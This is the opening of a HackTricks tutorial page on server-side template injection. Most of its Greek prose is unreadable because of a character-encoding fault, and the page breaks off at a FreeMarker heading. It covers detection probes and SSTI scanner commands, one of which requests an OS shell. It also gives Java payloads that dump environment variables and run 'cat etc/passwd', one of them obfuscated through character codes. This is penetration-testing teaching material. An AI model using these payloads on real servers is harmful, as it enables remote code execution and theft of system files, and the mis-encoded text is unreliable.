# SSTI (Server Side Template Injection)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Î•ÏÏ…Î¸ÏÎ¿Ï Î£Ï…Î½ÎµÏÎ³ÎµÎ¯Î¿Ï… AWS Ï„Î¿Ï… HackTricks)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ ÏƒÏ…Î½Î­Î´ÏÎ¹Î¿ ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÏ„Î·Î½ **Î™ÏƒÏ€Î±Î½Î¯Î±** ÎºÎ±Î¹ Î­Î½Î± Î±Ï€ÏŒ Ï„Î± Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ ÏƒÏ„Î·Î½ **Î•Ï…ÏÏÏ€Î·**. ÎœÎµ **Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Î·Î½ Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ Î³Î½ÏÏƒÎ·Ï‚**, Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ…Î½Î­Î´ÏÎ¹Î¿ Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯ Î­Î½Î±Î½ Ï€Ï…ÏÎ®Î½Î± ÏƒÏ…Î½Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯Î±Ï‚ ÎºÎ±Î¹ ÎµÏ€Î±Î³Î³ÎµÎ»Î¼Î±Ï„Î¹ÏÎ½ ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï€ÎµÎ´Î¯Î¿.

{% embed url="https://www.rootedcon.com/" %}

## Î¤Î¹ ÎµÎ¯Î½Î±Î¹ Î· SSTI (Server-Side Template Injection)

Î— ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€Î¿Ï… ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î±Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÏƒÎµÎ¹ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®. Î‘Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯ÎµÏ‚, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Î¿Ï… Ï„Î¿Ï… Jinja.

Î¤Î¿ Jinja ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î´Î·Î¼Î¿Ï†Î¹Î»Î­Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ web. Î‘Ï‚ ÎµÎ¾ÎµÏ„Î¬ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î­Î½Î± ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î± ÎºÏÎ´Î¹ÎºÎ± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Jinja:
```python
output = template.render(name=request.args.get('name'))
```
Î£Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÏÎ´Î¹ÎºÎ±, Ï„Î¿ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `name` Î±Ï€ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï€ÎµÏÎ½Î¹Î­Ï„Î±Î¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ ÏƒÏ„Î¿ Ï€ÏÏŒÏ„Ï…Ï€Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± `render`. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î¸ÎµÏ‰ÏÎ·Ï„Î¹ÎºÎ¬ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± ÎµÎ½Î¸Î¬ÏÏÏ…Î½Îµ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ± ÏƒÏ„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `name`, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Î­Î½Î± Ï†Î¿ÏÏ„Î¯Î¿ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„ÏŒ:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Î¤Î¿ payload `{{ÎºÎ±ÎºÏŒ-Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿-ÎµÎ´Ï}}` ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `name`. Î‘Ï…Ï„ÏŒ Ï„Î¿ payload Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¿Î´Î·Î³Î¯ÎµÏ‚ Ï„Î¿Ï… Jinja template Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿ ÎºÏÎ´Î¹ÎºÎ± Î® Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î· Î¼Î·Ï‡Î±Î½Î® Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½, Î±Ï€Î¿ÎºÏ„ÏÎ½Ï„Î±Ï‚ Ï€Î¹Î¸Î±Î½ÏÏ‚ Î­Î»ÎµÎ³Ï‡Î¿ ÎµÏ€Î¯ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.

Î“Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Ï„Î¹Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, Î¿Î¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯ÏƒÎ¿Ï…Î½ ÏŒÏ„Î¹ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î±Ï€Î¿ÏƒÎºÎ¿Ï€ÎµÎ¯ ÏƒÏ‰ÏƒÏ„Î¬ ÎºÎ±Î¹ ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÏ„Î±Î¹ Ï€ÏÎ¹Î½ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¸ÎµÎ¯ ÏƒÏ„Î± Ï€ÏÏŒÏ„Ï…Ï€Î±. Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ»Î­Î³Ï‡Î¿Ï… ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… ÎºÎ±Î¹ Î· Ï‡ÏÎ®ÏƒÎ· Ï„ÎµÏ‡Î½Î¹ÎºÏÎ½ Î±Ï€Î¿Ï†Ï…Î³Î®Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ ÏƒÏ„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎ¿Ï…Î½ ÏƒÏ„Î· Î¼ÎµÎ¯Ï‰ÏƒÎ· Ï„Î¿Ï… ÎºÎ¹Î½Î´ÏÎ½Î¿Ï… Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚.

### Î‘Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·

Î“Î¹Î± Ï„Î·Î½ Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ Î•Î½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ Î ÏÎ¿Ï„ÏÏ€Ï‰Î½ ÏƒÏ„Î·Î½ Î Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® (SSTI), Î±ÏÏ‡Î¹ÎºÎ¬, **Î· Î´Î¿ÎºÎ¹Î¼Î® Ï„Î¿Ï… Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï…** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î±Ï€Î»Î® Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ·. Î‘Ï…Ï„ÏŒ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Î¼Î¹Î±Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯Î±Ï‚ ÎµÎ¹Î´Î¹ÎºÏÎ½ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½ (**`${{<%[%'"}}%\`**) ÏƒÏ„Î¿ Ï€ÏÏŒÏ„Ï…Ï€Î¿ ÎºÎ±Î¹ Ï„Î·Î½ Î±Î½Î¬Î»Ï…ÏƒÎ· Ï„Ï‰Î½ Î´Î¹Î±Ï†Î¿ÏÏÎ½ ÏƒÏ„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÎµ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î­Î½Î±Î½Ï„Î¹ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎµÎ¹Î´Î¹ÎºÎ¿Ï payload. ÎŸÎ¹ Î­Î½Î´ÎµÎ¹Î¾ÎµÎ¹Ï‚ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:

* Î¡Î¯ÏˆÎ· ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰Î½, Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎºÎ±Î¹ Ï€Î¹Î¸Î±Î½ÏÏ‚ Ï„Î· Î¼Î·Ï‡Î±Î½Î® Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½.
* Î‘Ï€Î¿Ï…ÏƒÎ¯Î± Ï„Î¿Ï… payload ÏƒÏ„Î¿Î½ Î±Î½Ï„Î±Î½Î±ÎºÎ»Î±ÏƒÎ¼ÏŒ, Î® Î¼Î­ÏÎ· Ï„Î¿Ï… Î½Î± Î»ÎµÎ¯Ï€Î¿Ï…Î½, Ï…Ï€Î¿Î½Î¿ÏÎ½Ï„Î±Ï‚ ÏŒÏ„Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Ï„Î¿ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î± ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î±.
* **ÎšÎµÎ¯Î¼ÎµÎ½Î¿ ÎšÎµÎ¹Î¼Î­Î½Î¿Ï…**: Î”Î¹Î¬ÎºÏÎ¹ÏƒÎ· Î±Ï€ÏŒ XSS ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Î±Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î±Î¾Î¹Î¿Î»Î¿Î³ÎµÎ¯ Ï„Î¹Ï‚ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ (Ï€.Ï‡., `{{7*7}}`, `${7*7}`).
* **Î Î»Î±Î¯ÏƒÎ¹Î¿ ÎšÏÎ´Î¹ÎºÎ±**: Î•Ï€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ· Ï„Î·Ï‚ ÎµÏ…Ï€Î±Î¸ÎµÎ¯Î±Ï‚ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ `greeting` ÏƒÏ„Î¿ `http://vulnerable-website.com/?greeting=data.username` Î³Î¹Î± Î½Î± Î´Î¿ÏÎ¼Îµ Î±Î½ Î· Î­Î¾Î¿Î´Î¿Ï‚ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Î¼Î¹ÎºÎ® Î® ÏƒÏ„Î±Î¸ÎµÏÎ®, ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ `greeting=data.username}}hello` Ï€Î¿Ï… ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·.

#### Î¦Î¬ÏƒÎ· Î‘Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ·Ï‚

Î— Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Ï„Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î»Ï…ÏƒÎ· Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½ ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰Î½ Î® Ï„Î· Î´Î¿ÎºÎ¹Î¼Î® Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î± Î´Î¹Î±Ï†ÏŒÏÏ‰Î½ Ï†Î¿ÏÏ„Î¯Ï‰Î½ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Î³Î¹Î± Ï„Î· Î³Î»ÏÏƒÏƒÎ±. Î£Ï…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î± Ï†Î¿ÏÏ„Î¯Î± Ï€Î¿Ï… Ï€ÏÎ¿ÎºÎ±Î»Î¿ÏÎ½ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ `${7/0}`, `{{7/0}}`, ÎºÎ±Î¹ `<%= 7/0 %>`. Î— Ï€Î±ÏÎ±Ï„Î®ÏÎ·ÏƒÎ· Ï„Î·Ï‚ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ·Ï‚ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÎµ Î¼Î±Î¸Î·Î¼Î±Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¬Î¾ÎµÎ¹Ï‚ Î²Î¿Î·Î¸Î¬ ÏƒÏ„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Ï„Î·Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î·Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½.

## Î•ÏÎ³Î±Î»ÎµÎ¯Î±

### [TInjA](https://github.com/Hackmanit/TInjA)

Î­Î½Î± Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÏŒ ÏƒÎ±ÏÏÏ„Î· SSTI + CSTI Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î½Î­Î± Ï€Î¿Î»ÏÎ³Î»Ï‰Ï„Ï„Î±
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Î Î¯Î½Î±ÎºÎ±Ï‚ Î•Î½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ Î ÏÎ¿Ï„ÏÏ€Î¿Ï…](https://github.com/Hackmanit/template-injection-table)

Î­Î½Î±Ï‚ Î´Î¹Î±Î´ÏÎ±ÏƒÏ„Î¹ÎºÏŒÏ‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿Ï…Ï‚ Ï€Î¹Î¿ Î±Ï€Î¿Î´Î¿Ï„Î¹ÎºÎ¿ÏÏ‚ Ï€Î¿Î»ÏÎ³Î»Ï‰Ï„Ï„Î¿Ï…Ï‚ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÏƒÎµÏ‰Î½ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… Î¼Î±Î¶Î¯ Î¼Îµ Ï„Î¹Ï‚ Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ 44 Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏÎ½ Î¼Î·Ï‡Î±Î½ÏÎ½ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï….

## Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚

### Î“ÎµÎ½Î¹ÎºÎ­Ï‚

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ **Î»ÎµÎ¾Î¹ÎºÏŒ** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯** ÏƒÏ„Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± Î¿ÏÎ¹ÏƒÎ¼Î­Î½Ï‰Î½ Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¼Î·Ï‡Î±Î½Î­Ï‚ Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Î’Î±ÏƒÎ¹ÎºÎ® ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ·**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Ï„Ï‰Î½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚**
```java
${T(java.lang.System).getenv()}
```
**Java - Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· /etc/passwd**
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

